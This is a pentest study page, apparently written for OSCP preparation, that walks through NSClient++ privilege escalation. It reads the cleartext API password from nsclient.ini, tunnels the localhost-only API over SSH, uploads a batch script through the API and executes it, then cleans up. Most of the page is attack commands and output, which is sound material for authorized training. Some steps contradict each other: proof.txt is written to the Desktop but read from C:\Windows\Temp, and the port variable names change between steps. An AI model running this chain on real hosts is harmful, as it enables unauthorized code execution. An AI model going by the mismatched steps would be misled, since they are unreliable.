# Windows - Web - NSClient++

**Windows web supplement**

*Reach the localhost-only NSClient++ API through SSH, then use its external script endpoint.*

## Run this

> **Why:** This command gathers the windows web nsclient++ evidence needed to decide which documented route applies next.
~~~cmd
type "C:\Program Files\NSClient++\nsclient.ini"
~~~

Look for the API password, allowed hosts, CheckExternalScripts, and an existing script registration.

## Example output

~~~ini
password = $NSCPPassword
allowed hosts = 127.0.0.1
CheckExternalScripts = enabled
check = scripts\\check.bat
~~~

## What did you get?

- **Cleartext password and external scripts enabled:** run `boxset Password $Password`, then prepare the SSH tunnel in the next section.
- **Only localhost is allowed:** run `ssh -L $LocalPort:127.0.0.1:$RemotePort $Username@$BoxIP` and use the forwarded local port for every API request.

## Run this

> **Why:** This SSH connection tests the recovered credential or reaches a legacy daemon using the compatibility options it requires.
~~~bash
ssh -L $TunnelPort:127.0.0.1:$NSCPPort $Username@$BoxIP -N
curl -sk https://127.0.0.1:$TunnelPort/ -o /dev/null -w "%{http_code}\n"
~~~

## Example output

~~~text
302
~~~

## What did you get?

- **302 redirect to /index.html:** the tunnel reaches NSClient++.
- **Connection failure:** run `ss -ltnp | grep $LocalPort`, keep SSH open, and rerun `ssh -L $LocalPort:127.0.0.1:$RemotePort $Username@$BoxIP`.

> [!warning] 💡
> -N suppresses the remote shell but does not skip SSH authentication. The tunnel still prompts for the SSH password.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
~~~bash
curl -sk -u $AdminUser:$NSCPPassword \
  https://127.0.0.1:$TunnelPort/api/v1/queries \
  -o /dev/null -w "%{http_code}\n"
~~~

## Example output

~~~text
200
~~~

## What did you get?

- **200:** Basic Authentication succeeded. Upload an external script.
- **401 or 403:** rerun the request with `$Username` and `$Password`, then record whether the API account is authorized.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
~~~bash
cat > /tmp/check.bat <<'EOF'
@echo off
whoami > C:\Users\$Username\Desktop\proof.txt
EOF

curl -sk -u $AdminUser:$NSCPPassword \
  -X PUT --data-binary @/tmp/check.bat \
  https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat

curl -sk -u $AdminUser:$NSCPPassword \
  https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute
~~~

## Example output

~~~text
Added check as scripts\\check.bat
{"result":0}
~~~

## What did you get?

- **result: 0:** run `type C:\Windows\Temp\proof.txt` to confirm the service identity.
- **No output available:** run `type C:\Windows\Temp\proof.txt` to check the file written by the batch script.
- **404 or 403:** confirm the script name, route, and API privileges.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
~~~bash
curl -sk -u $AdminUser:$NSCPPassword \
  -X DELETE \
  https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat

curl -sk -u $AdminUser:$NSCPPassword \
  https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute
~~~

## Example output

~~~text
Script file was removed
verify_status=4xx
~~~

## What did you get?

- **Execution fails after deletion:** the temporary script is gone.
- **Execution still succeeds:** delete the script definition through the API, delete the file with `del C:\Windows\Temp\$ScriptName`, then rerun the verification request.

## Gotcha

Delete any proof files while SSH access still works. Remove target files first, then remove the NSClient++ script that created them. Do not leave the script registered after the test.

## External Resources

- [NSClient++ REST API](https://nsclient.org/docs/api/rest/)
- [NSClient++ scripts API](https://nsclient.org/docs/api/rest/scripts/)
- [HackTricks NSClient++ privilege escalation](https://book.hacktricks.xyz/windows-hardening/privilege-escalation#nsclient)
## Seen in
- *(no write-up yet)*

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
